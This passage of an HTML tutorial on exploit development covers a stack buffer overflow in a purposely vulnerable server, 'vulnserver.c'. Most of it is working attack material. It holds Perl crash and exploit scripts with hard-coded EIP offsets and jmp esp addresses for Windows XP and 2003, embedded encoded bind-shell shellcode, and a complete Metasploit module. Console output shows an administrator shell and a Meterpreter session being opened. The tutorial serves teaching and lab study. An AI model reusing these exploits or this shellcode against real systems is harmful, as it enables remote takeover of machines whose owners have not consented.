<span style="color: #5576D1">my</span> $port = <span style="color: #5576D1">shift</span> || 200;

<span style="color: #5576D1">my</span> $proto = <span style="color: #5576D1">getprotobyname</span>('tcp');

# get the port address
<span style="color: #5576D1">my</span> $iaddr = inet_aton($host);
<span style="color: #5576D1">my</span> $paddr = sockaddr_in($port, $iaddr);

<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">[+] Setting up socket\n</span>";
# create the <span style="color: #5576D1">socket</span>, <span style="color: #5576D1">connect</span> to the port
<span style="color: #5576D1">socket</span>(SOCKET, PF_INET, SOCK_STREAM, $proto) or <span style="color: #5576D1">die</span> "<span style="color: #7fec7f">socket: $!</span>";
<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">[+] Connecting to $host on port $port\n</span>";
<span style="color: #5576D1">connect</span>(SOCKET, $paddr) or <span style="color: #5576D1">die</span> "<span style="color: #7fec7f">connect: $!</span>";

<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">[+] Sending payload\n</span>";
<span style="color: #5576D1">print</span> SOCKET $junk."<span style="color: #7fec7f">\n</span>";

<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">[+] Payload sent\n</span>";

<span style="color: #5576D1">close</span> SOCKET or <span style="color: #5576D1">die</span> "<span style="color: #7fec7f">close: $!</span>";</pre>
<p>The vulnerable server dies, and EIP gets overwritten with A’s</p>
<pre style="border-bottom: #808080 1px solid; border-left: #808080 1px solid; padding-bottom: 5px; background-color: #5d5d5d; min-height: 40px; padding-left: 5px; width: 650px; padding-right: 5px; overflow: auto; border-top: #808080 1px solid; border-right: #808080 1px solid; padding-top: 5px">0:001&gt; g
(e00.de0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012e05c ebx=7ffd6000 ecx=00000000 edx=0012e446 esi=0040bdec edi=0012ebe0
eip=41414141 esp=0012e258 ebp=41414141 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212
41414141 ??              ???</pre>
<p>Using a metasploit pattern, we determine that the offset to EIP overwrite is at 504 bytes. So we’ll build a new crash script to verify the offset and see the contents of the registers when the overflow occurs :</p>
<p><!--.csharpcode, .csharpcode pre { 	font-size: small; 	color: black; 	font-family: consolas, "Courier New", courier, monospace; 	background-color: #ffffff; 	/*white-space: pre;*/ } .csharpcode pre { margin: 0em; } .csharpcode .rem { color: #d7df01; } .csharpcode .kwrd { color: #0000ff; } .csharpcode .str { color: #006080; } .csharpcode .op { color: #0000c0; } .csharpcode .preproc { color: #cc6633; } .csharpcode .asp { background-color: #ffff00; } .csharpcode .html { color: #800000; } .csharpcode .attr { color: #ff0000; } .csharpcode .alt  { 	background-color: #f4f4f4; 	width: 100%; 	margin: 0em; } .csharpcode .lnum { color: #606060; } --></p>
<pre style="border-bottom: #808080 1px solid; border-left: #808080 1px solid; padding-bottom: 5px; background-color: #5d5d5d; min-height: 40px; padding-left: 5px; width: 650px; padding-right: 5px; overflow: auto; border-top: #808080 1px solid; border-right: #808080 1px solid; padding-top: 5px">use strict;
use Socket;

my $totalbuffer=1000;
my $junk = "<span style="color: #7fec7f">\x41</span>" x 504;
my $eipoverwrite = "<span style="color: #7fec7f">\x42</span>" x 4;
my $junk2 = "<span style="color: #7fec7f">\x43</span>" x ($totalbuffer-length($junk.$eipoverwrite));

# initialize host and port
my $host = shift || 'localhost';
my $port = shift || 200;

my $proto = getprotobyname('tcp');

# get the port address
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($port, $iaddr);

print "<span style="color: #7fec7f">[+] Setting up socket\n</span>";
# create the socket, connect to the port
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "<span style="color: #7fec7f">socket: $!</span>";
print "<span style="color: #7fec7f">[+] Connecting to $host on port $port\n</span>";
connect(SOCKET, $paddr) or die "<span style="color: #7fec7f">connect: $!</span>";

print "<span style="color: #7fec7f">[+] Sending payload\n</span>";
print SOCKET $junk.$eipoverwrite.$junk2."<span style="color: #7fec7f">\n</span>";

print "<span style="color: #7fec7f">[+] Payload sent\n</span>";

<span style="color: #5576D1">close</span> SOCKET or die "<span style="color: #7fec7f">close: $!</span>";</pre>
<p>After sending 504 A’s, 4 B’s and a bunch of C’s, we can see the following register and stack contents :</p>
<p><!--.csharpcode, .csharpcode pre { 	font-size: small; 	color: black; 	font-family: consolas, "Courier New", courier, monospace; 	background-color: #ffffff; 	/*white-space: pre;*/ } .csharpcode pre { margin: 0em; } .csharpcode .rem { color: #d7df01; } .csharpcode .kwrd { color: #0000ff; } .csharpcode .str { color: #006080; } .csharpcode .op { color: #0000c0; } .csharpcode .preproc { color: #cc6633; } .csharpcode .asp { background-color: #ffff00; } .csharpcode .html { color: #800000; } .csharpcode .attr { color: #ff0000; } .csharpcode .alt  { 	background-color: #f4f4f4; 	width: 100%; 	margin: 0em; } .csharpcode .lnum { color: #606060; } --></p>
<pre style="border-bottom: #808080 1px solid; border-left: #808080 1px solid; padding-bottom: 5px; background-color: #5d5d5d; min-height: 40px; padding-left: 5px; width: 650px; padding-right: 5px; overflow: auto; border-top: #808080 1px solid; border-right: #808080 1px solid; padding-top: 5px">0:001&gt; g
(ed0.eb0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012e05c ebx=7ffde000 ecx=00000000 edx=0012e446 esi=0040bdec edi=0012ebe0
eip=42424242 esp=0012e258 ebp=41414141 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212
42424242 ??              ???
0:000&gt; d esp
0012e258  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0012e268  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0012e278  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0012e288  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0012e298  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0012e2a8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0012e2b8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0012e2c8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC</pre>
<p>Increase the junk size to see how much space you have available for your shellcode. This is important because you will need to specify this parameter in the metasploit module.</p>
<p>Change the $totalbuffer value to 2000, overflow still works as expected, and the contents of esp indicate that we have been able to fill memory with C’s up to esp+5d3 (1491 bytes). That will be our shellcode space (more or less)</p>
<p>All we need is to overwrite EIP with jmp esp (or call esp, or something similar), and put our shellcode instead of the C’s and we should be fine.</p>
<p>Using findjmp, we have found a working address for our Windows 2003 R2 SP2 server :</p>
<pre style="border-bottom: #808080 1px solid; border-left: #808080 1px solid; padding-bottom: 5px; background-color: #5d5d5d; min-height: 40px; padding-left: 5px; width: 650px; padding-right: 5px; overflow: auto; border-top: #808080 1px solid; border-right: #808080 1px solid; padding-top: 5px">findjmp.exe ws2_32.dll esp
Reg: esp
Scanning ws2_32.dll <span style="color: #5576D1">for</span> code usable with the esp <span style="color: #5576D1">register</span>
0x71C02B67      push esp - ret
Finished Scanning ws2_32.dll <span style="color: #5576D1">for</span> code usable with the esp <span style="color: #5576D1">register</span>
Found 1 usable addresses</pre>
<p>After doing some tests with shellcode, we can use the following conclusions to build the final exploits</p>
<ul>
<li>exclude 0xff from the shellcode </li>
<li>put some nop’s before the shellcode </li>
</ul>
<p>Our final exploit ( in perl, with a shell bound to tcp 5555 ) looks like this :</p>
<p><!--.csharpcode, .csharpcode pre { 	font-size: small; 	color: black; 	font-family: consolas, "Courier New", courier, monospace; 	background-color: #ffffff; 	/*white-space: pre;*/ } .csharpcode pre { margin: 0em; } .csharpcode .rem { color: #d7df01; } .csharpcode .kwrd { color: #0000ff; } .csharpcode .str { color: #006080; } .csharpcode .op { color: #0000c0; } .csharpcode .preproc { color: #cc6633; } .csharpcode .asp { background-color: #ffff00; } .csharpcode .html { color: #800000; } .csharpcode .attr { color: #ff0000; } .csharpcode .alt  { 	background-color: #f4f4f4; 	width: 100%; 	margin: 0em; } .csharpcode .lnum { color: #606060; } --></p>
<pre style="border-bottom: #808080 1px solid; border-left: #808080 1px solid; padding-bottom: 5px; background-color: #5d5d5d; min-height: 40px; padding-left: 5px; width: 650px; padding-right: 5px; overflow: auto; border-top: #808080 1px solid; border-right: #808080 1px solid; padding-top: 5px">#
<span style="color: #5576D1">print</span> "<span style="color: #7fec7f"> --------------------------------------\n</span>";
<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">     Writing Buffer Overflows\n</span>";
<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">       Peter Van Eeckhoutte\n</span>";
<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">     http://www.corelan.be:8800\n</span>";
<span style="color: #5576D1">print</span> "<span style="color: #7fec7f"> --------------------------------------\n</span>";
<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">    Exploit for vulnserver.c\n</span>";
<span style="color: #5576D1">print</span> "<span style="color: #7fec7f"> --------------------------------------\n</span>";
<span style="color: #5576D1">use</span> strict;
<span style="color: #5576D1">use</span> Socket;
<span style="color: #5576D1">my</span> $junk = "<span style="color: #7fec7f">\x90</span>" x 504;

#jmp esp (from ws2_32.dll)
<span style="color: #5576D1">my</span> $eipoverwrite = <span style="color: #5576D1">pack</span>('V',0x71C02B67);

#add some NOP's
<span style="color: #5576D1">my</span> $shellcode="<span style="color: #7fec7f">\x90</span>" x 50;

# windows/shell_bind_tcp - 702 bytes
# http:<span style="color: #d7df01">//www.metasploit.com</span>
# Encoder: x86/alpha_upper
# EXITFUNC=seh, LPORT=5555, RHOST=
$shellcode=$shellcode."<span style="color: #7fec7f">\x89\xe0\xd9\xd0\xd9\x70\xf4\x59\x49\x49\x49\x49\x49\x43</span>" .
"<span style="color: #7fec7f">\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58</span>" .
"<span style="color: #7fec7f">\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42</span>" .
"<span style="color: #7fec7f">\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30</span>" .
"<span style="color: #7fec7f">\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x42\x4a</span>" .
"<span style="color: #7fec7f">\x4a\x4b\x50\x4d\x4d\x38\x4c\x39\x4b\x4f\x4b\x4f\x4b\x4f</span>" .
"<span style="color: #7fec7f">\x45\x30\x4c\x4b\x42\x4c\x51\x34\x51\x34\x4c\x4b\x47\x35</span>" .
"<span style="color: #7fec7f">\x47\x4c\x4c\x4b\x43\x4c\x43\x35\x44\x38\x45\x51\x4a\x4f</span>" .
"<span style="color: #7fec7f">\x4c\x4b\x50\x4f\x44\x58\x4c\x4b\x51\x4f\x47\x50\x43\x31</span>" .
"<span style="color: #7fec7f">\x4a\x4b\x47\x39\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e</span>" .
"<span style="color: #7fec7f">\x50\x31\x49\x50\x4a\x39\x4e\x4c\x4c\x44\x49\x50\x42\x54</span>" .
"<span style="color: #7fec7f">\x45\x57\x49\x51\x48\x4a\x44\x4d\x45\x51\x48\x42\x4a\x4b</span>" .
"<span style="color: #7fec7f">\x4c\x34\x47\x4b\x46\x34\x46\x44\x51\x38\x42\x55\x4a\x45</span>" .
"<span style="color: #7fec7f">\x4c\x4b\x51\x4f\x51\x34\x43\x31\x4a\x4b\x43\x56\x4c\x4b</span>" .
"<span style="color: #7fec7f">\x44\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b</span>" .
"<span style="color: #7fec7f">\x44\x43\x46\x4c\x4c\x4b\x4b\x39\x42\x4c\x51\x34\x45\x4c</span>" .
"<span style="color: #7fec7f">\x45\x31\x49\x53\x46\x51\x49\x4b\x43\x54\x4c\x4b\x51\x53</span>" .
"<span style="color: #7fec7f">\x50\x30\x4c\x4b\x47\x30\x44\x4c\x4c\x4b\x42\x50\x45\x4c</span>" .
"<span style="color: #7fec7f">\x4e\x4d\x4c\x4b\x51\x50\x44\x48\x51\x4e\x43\x58\x4c\x4e</span>" .
"<span style="color: #7fec7f">\x50\x4e\x44\x4e\x4a\x4c\x46\x30\x4b\x4f\x4e\x36\x45\x36</span>" .
"<span style="color: #7fec7f">\x51\x43\x42\x46\x43\x58\x46\x53\x47\x42\x45\x38\x43\x47</span>" .
"<span style="color: #7fec7f">\x44\x33\x46\x52\x51\x4f\x46\x34\x4b\x4f\x48\x50\x42\x48</span>" .
"<span style="color: #7fec7f">\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x46\x30\x4b\x4f\x48\x56</span>" .
"<span style="color: #7fec7f">\x51\x4f\x4c\x49\x4d\x35\x43\x56\x4b\x31\x4a\x4d\x45\x58</span>" .
"<span style="color: #7fec7f">\x44\x42\x46\x35\x43\x5a\x43\x32\x4b\x4f\x4e\x30\x45\x38</span>" .
"<span style="color: #7fec7f">\x48\x59\x45\x59\x4a\x55\x4e\x4d\x51\x47\x4b\x4f\x48\x56</span>" .
"<span style="color: #7fec7f">\x51\x43\x50\x53\x50\x53\x46\x33\x46\x33\x51\x53\x50\x53</span>" .
"<span style="color: #7fec7f">\x47\x33\x46\x33\x4b\x4f\x4e\x30\x42\x46\x42\x48\x42\x35</span>" .
"<span style="color: #7fec7f">\x4e\x53\x45\x36\x50\x53\x4b\x39\x4b\x51\x4c\x55\x43\x58</span>" .
"<span style="color: #7fec7f">\x4e\x44\x45\x4a\x44\x30\x49\x57\x46\x37\x4b\x4f\x4e\x36</span>" .
"<span style="color: #7fec7f">\x42\x4a\x44\x50\x50\x51\x50\x55\x4b\x4f\x48\x50\x45\x38</span>" .
"<span style="color: #7fec7f">\x49\x34\x4e\x4d\x46\x4e\x4a\x49\x50\x57\x4b\x4f\x49\x46</span>" .
"<span style="color: #7fec7f">\x46\x33\x50\x55\x4b\x4f\x4e\x30\x42\x48\x4d\x35\x51\x59</span>" .
"<span style="color: #7fec7f">\x4c\x46\x51\x59\x51\x47\x4b\x4f\x49\x46\x46\x30\x50\x54</span>" .
"<span style="color: #7fec7f">\x46\x34\x50\x55\x4b\x4f\x48\x50\x4a\x33\x43\x58\x4b\x57</span>" .
"<span style="color: #7fec7f">\x43\x49\x48\x46\x44\x39\x51\x47\x4b\x4f\x4e\x36\x46\x35</span>" .
"<span style="color: #7fec7f">\x4b\x4f\x48\x50\x43\x56\x43\x5a\x45\x34\x42\x46\x45\x38</span>" .
"<span style="color: #7fec7f">\x43\x53\x42\x4d\x4b\x39\x4a\x45\x42\x4a\x50\x50\x50\x59</span>" .
"<span style="color: #7fec7f">\x47\x59\x48\x4c\x4b\x39\x4d\x37\x42\x4a\x47\x34\x4c\x49</span>" .
"<span style="color: #7fec7f">\x4b\x52\x46\x51\x49\x50\x4b\x43\x4e\x4a\x4b\x4e\x47\x32</span>" .
"<span style="color: #7fec7f">\x46\x4d\x4b\x4e\x50\x42\x46\x4c\x4d\x43\x4c\x4d\x42\x5a</span>" .
"<span style="color: #7fec7f">\x46\x58\x4e\x4b\x4e\x4b\x4e\x4b\x43\x58\x43\x42\x4b\x4e</span>" .
"<span style="color: #7fec7f">\x48\x33\x42\x36\x4b\x4f\x43\x45\x51\x54\x4b\x4f\x48\x56</span>" .
"<span style="color: #7fec7f">\x51\x4b\x46\x37\x50\x52\x50\x51\x50\x51\x50\x51\x43\x5a</span>" .
"<span style="color: #7fec7f">\x45\x51\x46\x31\x50\x51\x51\x45\x50\x51\x4b\x4f\x4e\x30</span>" .
"<span style="color: #7fec7f">\x43\x58\x4e\x4d\x49\x49\x44\x45\x48\x4e\x46\x33\x4b\x4f</span>" .
"<span style="color: #7fec7f">\x48\x56\x43\x5a\x4b\x4f\x4b\x4f\x50\x37\x4b\x4f\x4e\x30</span>" .
"<span style="color: #7fec7f">\x4c\x4b\x51\x47\x4b\x4c\x4b\x33\x49\x54\x42\x44\x4b\x4f</span>" .
"<span style="color: #7fec7f">\x48\x56\x51\x42\x4b\x4f\x48\x50\x43\x58\x4a\x50\x4c\x4a</span>" .
"<span style="color: #7fec7f">\x43\x34\x51\x4f\x50\x53\x4b\x4f\x4e\x36\x4b\x4f\x48\x50</span>" .
"<span style="color: #7fec7f">\x41\x41</span>";

# initialize host and port
<span style="color: #5576D1">my</span> $host = <span style="color: #5576D1">shift</span> || 'localhost';
<span style="color: #5576D1">my</span> $port = <span style="color: #5576D1">shift</span> || 200;

<span style="color: #5576D1">my</span> $proto = <span style="color: #5576D1">getprotobyname</span>('tcp');

# get the port address
<span style="color: #5576D1">my</span> $iaddr = inet_aton($host);
<span style="color: #5576D1">my</span> $paddr = sockaddr_in($port, $iaddr);

<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">[+] Setting up socket\n</span>";
# create the <span style="color: #5576D1">socket</span>, <span style="color: #5576D1">connect</span> to the port
<span style="color: #5576D1">socket</span>(SOCKET, PF_INET, SOCK_STREAM, $proto) or <span style="color: #5576D1">die</span> "<span style="color: #7fec7f">socket: $!</span>";
<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">[+] Connecting to $host on port $port\n</span>";
<span style="color: #5576D1">connect</span>(SOCKET, $paddr) or <span style="color: #5576D1">die</span> "<span style="color: #7fec7f">connect: $!</span>";

<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">[+] Sending payload\n</span>";
<span style="color: #5576D1">print</span> SOCKET $junk.$eipoverwrite.$shellcode."<span style="color: #7fec7f">\n</span>";

<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">[+] Payload sent\n</span>";
<span style="color: #5576D1">print</span> "<span style="color: #7fec7f">[+] Attempting to telnet to $host on port 5555...\n</span>";
<span style="color: #5576D1">system</span>("<span style="color: #7fec7f">telnet $host 5555</span>");

<span style="color: #5576D1">close</span> SOCKET or <span style="color: #5576D1">die</span> "<span style="color: #7fec7f">close: $!</span>";</pre>
<p>Exploit output :</p>
<pre style="border-bottom: #808080 1px solid; border-left: #808080 1px solid; padding-bottom: 5px; background-color: #5d5d5d; min-height: 40px; padding-left: 5px; width: 650px; padding-right: 5px; overflow: auto; border-top: #808080 1px solid; border-right: #808080 1px solid; padding-top: 5px">root@backtrack4:/tmp# perl sploit.pl 192.168.24.3 200
 --------------------------------------
     Writing Buffer Overflows
       Peter Van Eeckhoutte
     http:<span style="color: #d7df01">//www.corelan.be:8800</span>
 --------------------------------------
    Exploit for vulnserver.c
 --------------------------------------
[+] Setting up <span style="color: #5576D1">socket</span>
[+] Connecting to 192.168.24.3 on port 200
[+] Sending payload
[+] Payload sent
[+] Attempting to telnet to 192.168.24.3 on port 5555...
Trying 192.168.24.3...
Connected to 192.168.24.3.
Escape character is '^]'.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\vulnserver\lcc&gt;whoami
whoami
win2003-01\administrator</pre>
<p>The most important parameters that can be taken from this exploit are</p>
<ul>
<li>offset to ret (eip overwrite) is 504 </li>
<li>windows 2003 R2 SP2 (English) jump address is 0x71C02B67 </li>
<li>shellcode should not contain 0×00 or 0xff </li>
<li>shellcode can be more or less 1400 bytes </li>
</ul>
<p>Futhermore, after running the same tests against a Windows XP SP3 (English), we determine that the offset is the same, but the jmp address must be changed (to for example 0x7C874413).&nbsp; We’ll build a metasploit module that will allow you to select one of these 2 targets, and will use the correct jmp address.</p>
<h3>Converting the exploit to metasploit</h3>
<p>First, you need to determine what type your exploit will be, because that will determine the place within the metasploit folder structure where the exploit will be saved.&nbsp; If your exploit is targetting a windows based ftp server, it would need to be placed under the windows ftp server exploits.</p>
<p><em>Metasploit modules are saved in the framework3xx folder structure, under /modules/exploits. In that folder, the exploits are broken down into operating systems first, and then services.</em></p>
<p>Our server runs on windows, so we’ll put it under windows. The windows fodler contains a number of folders already (from antivirus to wins), include a “misc” folder.&nbsp; We’ll put our exploit under “misc” (or we could put it under telnet) because it does not really belong to any of the other types.</p>
<p>We’ll create our metasploit module under %metasploit%/modules/windows/misc :</p>
<p><!--.csharpcode, .csharpcode pre { 	font-size: small; 	color: black; 	font-family: consolas, "Courier New", courier, monospace; 	background-color: #ffffff; 	/*white-space: pre;*/ } .csharpcode pre { margin: 0em; } .csharpcode .rem { color: #d7df01; } .csharpcode .kwrd { color: #0000ff; } .csharpcode .str { color: #006080; } .csharpcode .op { color: #0000c0; } .csharpcode .preproc { color: #cc6633; } .csharpcode .asp { background-color: #ffff00; } .csharpcode .html { color: #800000; } .csharpcode .attr { color: #ff0000; } .csharpcode .alt  { 	background-color: #f4f4f4; 	width: 100%; 	margin: 0em; } .csharpcode .lnum { color: #606060; } --></p>
<pre style="border-bottom: #808080 1px solid; border-left: #808080 1px solid; padding-bottom: 5px; background-color: #5d5d5d; min-height: 40px; padding-left: 5px; width: 650px; padding-right: 5px; overflow: auto; border-top: #808080 1px solid; border-right: #808080 1px solid; padding-top: 5px">root@backtrack4:/# cd /pentest/exploits/framework3/modules/exploits/windows/misc
root@backtrack4:/pentest/exploits/framework3/modules/exploits/windows/misc# vi custom_vulnserver.rb</pre>
<p>&nbsp;</p>
<p><!--.csharpcode, .csharpcode pre { 	font-size: small; 	color: black; 	font-family: consolas, "Courier New", courier, monospace; 	background-color: #ffffff; 	/*white-space: pre;*/ } .csharpcode pre { margin: 0em; } .csharpcode .rem { color: #d7df01; } .csharpcode .kwrd { color: #0000ff; } .csharpcode .str { color: #006080; } .csharpcode .op { color: #0000c0; } .csharpcode .preproc { color: #cc6633; } .csharpcode .asp { background-color: #ffff00; } .csharpcode .html { color: #800000; } .csharpcode .attr { color: #ff0000; } .csharpcode .alt  { 	background-color: #f4f4f4; 	width: 100%; 	margin: 0em; } .csharpcode .lnum { color: #606060; } --></p>
<pre style="border-bottom: #808080 1px solid; border-left: #808080 1px solid; padding-bottom: 5px; background-color: #5d5d5d; min-height: 40px; padding-left: 5px; width: 650px; padding-right: 5px; overflow: auto; border-top: #808080 1px solid; border-right: #808080 1px solid; padding-top: 5px"><span style="color: #d7df01">#</span>
<span style="color: #d7df01">#</span>
<span style="color: #d7df01"># Custom metasploit exploit for vulnserver.c</span>
<span style="color: #d7df01"># Written by Peter Van Eeckhoutte</span>
<span style="color: #d7df01">#</span>
<span style="color: #d7df01">#</span>
<span style="color: #00008b">require</span> 'msf/core'

<span style="color: #5576D1">class</span> Metasploit3 &lt; Msf::Exploit::Remote

      include Msf::Exploit::Remote::Tcp

      <span style="color: #5576D1">def</span> initialize(info = {})
                <span style="color: #5576D1">super</span>(update_info(info,
                        'Name'           =&gt; 'Custom vulnerable server stack overflow',
                        'Description'    =&gt; %q{
                                        This <span style="color: #5576D1">module</span> exploits a stack overflow <span style="color: #5576D1">in</span> a
                                        custom vulnerable server.
                                             },
                        'Author'         =&gt; [ 'Peter Van Eeckhoutte' ],
                        'Version'        =&gt; '$Revision: 9999 $',
                        'DefaultOptions' =&gt;
                                {
                                        'EXITFUNC' =&gt; 'process',
                                },
                        'Payload'        =&gt;
                                {
                                        'Space'    =&gt; 1400,
                                        'BadChars' =&gt; "<span style="color: #7fec7f">\x00\xff</span>",
                                },
                        'Platform'       =&gt; 'win',

                        'Targets'        =&gt;
                                [
                                        ['Windows XP SP3 En',
                                          { 'Ret' =&gt; 0x7c874413, 'Offset' =&gt; 504 } ],
                                        ['Windows 2003 Server R2 SP2',
                                          { 'Ret' =&gt; 0x71c02b67, 'Offset' =&gt; 504  } ],
                                ],
                        'DefaultTarget' =&gt; 0,

                        'Privileged'     =&gt; <span style="color: #5576D1">false</span>
                        ))

                        register_options(
                        [
                                Opt::RPORT(200)
                        ], <span style="color: #5576D1">self</span>.<span style="color: #5576D1">class</span>)
       <span style="color: #5576D1">end</span>

       <span style="color: #5576D1">def</span> exploit
          connect

          junk = make_nops(target['Offset'])
          sploit = junk + [target.ret].pack('V') + make_nops(50) + payload.encoded
          sock.put(sploit)

          handler
          disconnect

       <span style="color: #5576D1">end</span>

<span style="color: #5576D1">end</span></pre>
<p>We see the following components :</p>
<ul>
<li>first, put “require msf/core”, which will be valid for all metasploit exploits </li>
<li>define the class. In our case, it is a remote exploit. </li>
<li>Next, set exploit information and exploit definitions :
<ul>
<li>include : in our case, it is a plain tcp connection, so we use Msf::Exploit::Remote::Tcp
<ul>
<li>Metasploit has handlers for http, ftp, etc… (which will help you building exploits faster because you don’t have to write the entire conversation yourself) </li>
</ul>
</li>
<li>Information :
<ul>
<li>Payload : define the length and badchars (0×00 and 0xff in our case) </li>
<li>Define the targets, and define target-specific settings such as return address, offset, etc </li>
</ul>
</li>
<li>Exploit
<ul>
<li>connect&nbsp; (which will set up the connection to the remote port) </li>
<li>build the buffer
<ul>
<li>junk (nops, with size of offset) </li>
<li>add the return address, more nops, and then the encoded payload </li>
</ul>
</li>
<li>write the buffer to the connection </li>
<li>handle the exploit </li>
<li>disconnect </li>
</ul>
</li>
</ul>
</li>
</ul>
<p>That’s it</p>
<p>Now open msfconsole. If there is an error in your script, you will see information about the error while msfconsole loads.&nbsp; If msfconsole was already loaded, you’ll have to close it again before you can use this new module (or before you can use updated module if you have made a change)</p>
<h3>Test the exploit</h3>
<h4>Test 1 : Windows XP SP3</h4>
<p><!--.csharpcode, .csharpcode pre { 	font-size: small; 	color: black; 	font-family: consolas, "Courier New", courier, monospace; 	background-color: #ffffff; 	/*white-space: pre;*/ } .csharpcode pre { margin: 0em; } .csharpcode .rem { color: #d7df01; } .csharpcode .kwrd { color: #0000ff; } .csharpcode .str { color: #006080; } .csharpcode .op { color: #0000c0; } .csharpcode .preproc { color: #cc6633; } .csharpcode .asp { background-color: #ffff00; } .csharpcode .html { color: #800000; } .csharpcode .attr { color: #ff0000; } .csharpcode .alt  { 	background-color: #f4f4f4; 	width: 100%; 	margin: 0em; } .csharpcode .lnum { color: #606060; } --></p>
<pre style="border-bottom: #808080 1px solid; border-left: #808080 1px solid; padding-bottom: 5px; background-color: #5d5d5d; min-height: 40px; padding-left: 5px; width: 650px; padding-right: 5px; overflow: auto; border-top: #808080 1px solid; border-right: #808080 1px solid; padding-top: 5px">root@backtrack4:/pentest/exploits/framework3<span style="color: #d7df01"># ./msfconsole </span>

                |                    |      _) |
 __ `__ \   _ \ __|  _` |  __| __ \  |  _ \  | __|
 |   |   |  __/ |   (   |\__ \ |   | | (   | | |
_|  _|  _|\___|\__|\__,_|____/ .__/ _|\___/ _|\__|
                              _|                   

       =[ msf v3.3-dev
+ -- --=[ 395 exploits - 239 payloads
+ -- --=[ 20 encoders - 7 nops
       =[ 187 aux

msf &gt; use windows/misc/custom_vulnserver
msf exploit(custom_vulnserver) &gt; show options

<a style="color: #ff0000" href="http://www.ruby-doc.org/docs/rdoc/1.9/classes/Module.html">Module</a> options:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  200              yes       The target port     

Exploit target:

   Id  Name
   --  ----
   0   Windows XP SP3 En  

msf exploit(custom_vulnserver) &gt; set rhost 192.168.24.10
rhost =&gt; 192.168.24.10
msf exploit(custom_vulnserver) &gt; show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows XP SP3 En
   1   Windows 2003 Server R2 SP2  

msf exploit(custom_vulnserver) &gt; set target 0
target =&gt; 0
msf exploit(custom_vulnserver) &gt; set payload windows/meterpreter/bind_tcp
payload =&gt; windows/meterpreter/bind_tcp
msf exploit(custom_vulnserver) &gt; show options

<a style="color: #ff0000" href="http://www.ruby-doc.org/docs/rdoc/1.9/classes/Module.html">Module</a> options:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.24.10   yes       The target address
   RPORT  200              yes       The target port     

Payload options (windows/meterpreter/bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process
   LPORT     4444             yes       The local port
   RHOST     192.168.24.10   no        The target address                    

Exploit target:

   Id  Name
   --  ----
   0   Windows XP SP3 En  

msf exploit(custom_vulnserver) &gt; exploit

[*] Started bind handler
[*] Transmitting intermediate stager <span style="color: #5576D1">for</span> over-sized stage...(216 bytes)
[*] Sending stage (718336 bytes)
[*] Meterpreter session 1 opened (192.168.24.1:42150 -&gt; 192.168.24.10:4444)      

meterpreter &gt; sysinfo
Computer: SPLOITBUILDER1
OS      : Windows XP (Build 2600, Service Pack 3).</pre>
<p>&nbsp;</p>
<h4>Test 2 : Windows 2003 Server R2 SP2</h4>
<p>(continued from exploit to XP) :</p>
<p><!--.csharpcode, .csharpcode pre { 	font-size: small; 	color: black; 	font-family: consolas, "Courier New", courier, monospace; 	background-color: #ffffff; 	/*white-space: pre;*/ } .csharpcode pre { margin: 0em; } .csharpcode .rem { color: #d7df01; } .csharpcode .kwrd { color: #0000ff; } .csharpcode .str { color: #006080; } .csharpcode .op { color: #0000c0; } .csharpcode .preproc { color: #cc6633; } .csharpcode .asp { background-color: #ffff00; } .csharpcode .html { color: #800000; } .csharpcode .attr { color: #ff0000; } .csharpcode .alt  { 	background-color: #f4f4f4; 	width: 100%; 	margin: 0em; } .csharpcode .lnum { color: #606060; } --></p>
